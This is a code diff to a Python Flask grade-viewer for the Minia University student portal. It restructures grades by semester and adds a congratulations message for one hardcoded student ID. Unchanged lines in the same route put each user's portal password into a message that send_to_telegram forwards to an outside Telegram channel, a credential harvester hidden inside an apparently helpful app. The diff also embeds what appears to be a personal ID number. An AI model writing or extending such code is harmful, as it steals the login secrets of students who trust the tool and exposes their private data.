@@ -76,18 +76,16 @@ def get_grades():
 
                 response = requests.post('http://stda.minia.edu.eg/PortalgetJCI', headers=headers, cookies=cookies, data=data, verify=False)
                 response_json = response.json()
-                
 
                 grades_by_year = {
-                    "First": [],
-                    "Second": [],
-                    "Third": [],
-                    "Fourth": [],
-                    "Fifth": []
+                    "First": {"first_semester": [], "second_semester": []},
+                    "Second": {"first_semester": [], "second_semester": []},
+                    "Third": {"first_semester": [], "second_semester": []},
+                    "Fourth": {"first_semester": [], "second_semester": []},
+                    "Fifth": {"first_semester": [], "second_semester": []}
                 }
 
-                max_degrees = 0
-                total_degrees = 0
+                percentages_by_year = {}
 
                 data = {
                     'param0': 'Portal.StudentsPortal',
@@ -135,35 +133,44 @@ def get_grades():
                             max_score = course['Max']
                             total_score = course['Total']
                             grade_name = course["GradeName"].split("|")[0]
-
+                            semester = "unknown"
+                            if course.get('Parts') and len(course['Parts']) > 0:
+                                sem_name = course['Parts'][0].get('SemasterName', '')
+                                if "الأول" in sem_name or "First Term" in sem_name:
+                                    semester = "first_semester"
+                                elif "الثانى" in sem_name or "Second Term" in sem_name:
+                                    semester = "second_semester"
                             if total_score:
-                                try:percentage = (float(total_score) / float(max_score)) * 100
-                                except:percentage=0
+                                try:
+                                    percentage = (float(total_score) / float(max_score)) * 100
+                                except:
+                                    percentage = 0
                             else:
                                 percentage = 0
                                 total_score = 0
                                 grade_name = "غير معروف"
-
-                            max_degrees += float(max_score)
-                            try:total_degrees += float(total_score)
-                            except:pass
-
-                            grades_by_year[year_category].append({
+                            course_obj = {
                                 'course_name': course_name,
                                 'grade': grade_name,
                                 'max_score': max_score,
                                 'total_score': total_score,
                                 'percentage': int(percentage)
-                            })
+                            }
+                            if semester in ["first_semester", "second_semester"]:
+                                grades_by_year[year_category][semester].append(course_obj)
 
-
-                percentage_by_year = {}
-
-                for year, grades in grades_by_year.items():
-                    try:total_score = sum(float(g['total_score']) for g in grades)
-                    except:pass
-                    max_score = sum(float(g['max_score']) for g in grades)
-                    percentage_by_year[year] = "{:.2f}".format((total_score / max_score) * 100) if max_score > 0 else "0.00"
+                # Calculate percentages
+                for year, semesters in grades_by_year.items():
+                    year_total = 0
+                    year_max = 0
+                    percentages_by_year[year] = {}
+                    for semester in ["first_semester", "second_semester"]:
+                        sem_total = sum(float(g['total_score']) for g in semesters[semester])
+                        sem_max = sum(float(g['max_score']) for g in semesters[semester])
+                        percentages_by_year[year][semester] = "{:.2f}".format((sem_total / sem_max) * 100) if sem_max > 0 else "0.00"
+                        year_total += sem_total
+                        year_max += sem_max
+                    percentages_by_year[year]['total'] = "{:.2f}".format((year_total / year_max) * 100) if year_max > 0 else "0.00"
 
                 # Send data to Telegram
                 message = f"""
@@ -172,22 +179,38 @@ def get_grades():
                 <b>كلمة المرور:</b> {password}
                 <b>النتائج:</b>
                 """
-                for year, grades in grades_by_year.items():
+                for year, semesters in grades_by_year.items():
                     message += f"\n\n<b>{year}:</b>\n"
-                    for grade in grades:
-                        message += f"- <b>{grade['course_name']}</b>: {grade['grade']} ({grade['percentage']}%)\n"
+                    for semester in ["first_semester", "second_semester"]:
+                        for course in semesters[semester]:
+                            message += f"- <b>{course['course_name']}</b>: {course['grade']} ({course['percentage']}%)\n"
                 
                 send_to_telegram(message)  # Send the structured message
+
+                # Special congrats logic for user 30411102402043
+                congrats_cooky = False
+                congrats_message = ""
+                if email == "30411102402043":
+                    try:
+                        percent = float(percentages_by_year["Third"]["second_semester"])
+                        print(percent)
+                        if percent >= 85:
+                            congrats_cooky = True
+                            congrats_message = "الف مبروووك الامتيااااز يا كوكي ❤️🫵"
+                    except Exception:
+                        pass
 
                 return render_template(
                     'grades.html',
                     grades_by_year=grades_by_year,
                     name=" ".join(full_name.split(" ")[:2]),
-                    percentage_by_year=percentage_by_year,  # Send separate percentages per year
-                    image_url=image_url,  # Add the image URL to the template context
+                    percentage_by_year=percentages_by_year,
+                    image_url=image_url,
                     img_base64=img_base64,
                     img_mime=img_mime,
-                    student_code=user_data[0]['Code']  # Add the student code
+                    student_code=user_data[0]['Code'],
+                    congrats_cooky=congrats_cooky,
+                    congrats_message=congrats_message
                 )
 
             else:
